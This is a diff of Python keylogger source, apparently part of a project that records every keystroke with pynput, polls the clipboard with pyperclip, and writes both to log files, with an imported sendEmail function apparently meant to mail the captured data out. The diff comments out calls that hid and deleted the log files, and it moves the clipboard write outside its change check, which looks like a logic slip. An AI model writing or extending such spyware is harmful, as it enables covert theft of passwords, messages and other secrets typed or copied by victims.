@@ -7,7 +7,7 @@ from pynput import keyboard
 import pyperclip
 from threading import Thread
 import ctypes
-from emailFunctionality import sendEmail, hide, unhide, remove
+from emailFunctionality import sendEmail
 from encryption import encryptContents 
 
 ThreadRunning = True
@@ -26,17 +26,17 @@ def on_press(key):
     if key == keyboard.Key.esc:
         print("escape")
         ThreadRunning = False
-        unhide()
-        remove()
+        # unhide()
+        # remove()
         # atexit.register(remove)
         return False  
     
     keyPressed = returnKeyType(key)
 
-    unhide()
+    # unhide()
     with open(log_file, "a") as keyLogs:
         keyLogs.write(parseOutput(keyPressed))
-    hide()
+    # hide()
 
 def returnKeyType(key):
     try:
@@ -60,10 +60,10 @@ def checkClipBoard():
         if currContent != prevContent:
             prevContent = currContent
 
-            unhide()
-            with open(clipBoard_file, "a") as clipBoardKeyLogs:
-               clipBoardKeyLogs.write(parseOutput(prevContent))
-            hide()
+            # unhide()
+        with open(clipBoard_file, "a") as clipBoardKeyLogs:
+            clipBoardKeyLogs.write(parseOutput(prevContent))
+            # hide()
         time.sleep(1)
     
 
